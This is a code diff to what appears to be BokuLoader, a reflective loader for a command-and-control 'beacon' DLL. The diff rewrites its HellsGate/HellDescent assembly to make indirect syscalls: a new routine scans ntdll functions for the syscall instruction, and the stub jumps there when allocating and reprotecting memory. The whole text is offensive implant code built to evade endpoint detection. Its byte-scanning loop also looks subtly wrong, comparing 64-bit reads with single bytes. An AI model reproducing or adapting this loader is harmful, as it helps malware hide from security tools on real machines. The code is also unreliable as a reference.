@@ -54,7 +54,7 @@ void * BokuLoader()
             size = raw_beacon_dll.size + 0x2000;
             oldprotect = 0;
             // NtProtectVirtualMemory syscall
-            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
+            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
             ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
             // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
@@ -70,7 +70,7 @@ void * BokuLoader()
         if(base){
             oldprotect = 0;
             virtual_beacon_dll.dllBase = base;
-            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
+            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
             ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
         }
     }
@@ -82,7 +82,7 @@ void * BokuLoader()
             if(base){
                 oldprotect = 0;
                 virtual_beacon_dll.dllBase = base;
-                HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
+                HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
                 ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
             }
         }
@@ -91,7 +91,7 @@ void * BokuLoader()
         // Allocate new memory to write our new RDLL too
         base = NULL;
         size = raw_beacon_dll.size;
-        HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory));
+        HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory), api.pNtAllocateVirtualMemory);
         ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon_dll.BeaconMemoryProtection);
         RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
 
@@ -115,7 +115,7 @@ void * BokuLoader()
         size = virtual_beacon_dll.TextSectionSize;
         newprotect = PAGE_EXECUTE_READ;
         // NtProtectVirtualMemory syscall
-        HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
+        HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
         ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
     }
 
@@ -1126,17 +1126,38 @@ __asm__(
     "pop rdi           \n"
     "ret               \n"
 
-"HellsGate:        \n"  // Loads the Syscall number into the R11 register before calling HellDescent()
-    "xor r11, r11  \n"
-    "mov r11d, ecx \n" // Save Syscall Number in R11
-    "ret           \n"
+"HellsGate: \n"  // Loads the Syscall number into the R11 register before calling HellDescent()
+    "xor r11, r11 \n"
+    "mov r11d, ecx \n"  // Save Syscall Number in R11
+    "push rdx \n"
+    "pop rcx \n" // Save NtApi address in RCX
+    "call GetSyscallAddress \n"
+    "mov r15, rcx \n" //Save syscall address in r15
+    "ret \n"
 
-"HellDescent:      \n" // Called directly after HellsGate
-    "xor rax, rax  \n"
-    "mov r10, rcx  \n"
-    "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
-    "syscall       \n"
-    "ret           \n"
+"HellDescent: \n" // Called directly after HellsGate
+    "xor rax, rax \n"
+    "mov r10, rcx \n"
+    "mov eax, r11d \n"  // Move the Syscall Number into RAX
+    "jmp r15 \n"
+    
+"GetSyscallAddress: \n"  // Get the syscall address by byte by byte checking
+    "mov edx, 25 \n"
+"find_syscall_address_loop: \n"
+    "mov r15, [rcx+rdx-1] \n"
+    "cmp r15, 0x05 \n"
+    "jne find_syscall_address_next \n"
+    "mov r15, [rcx+rdx-2] \n"
+    "cmp r15, 0x0F \n"
+    "jne find_syscall_address_next \n"
+    "lea rcx, [rcx+rdx-2] \n"
+    "mov rax, rcx \n"
+    "ret \n"
+"find_syscall_address_next: \n"
+    "dec edx \n"
+    "jnz find_syscall_address_loop \n"
+    "xor rax, rax \n"
+    "ret \n"
 
 "getFirstEntry:          \n"  // RAX, RCX
     "mov rax, gs:[0x60]  \n"  // ProcessEnvironmentBlock // GS = TEB
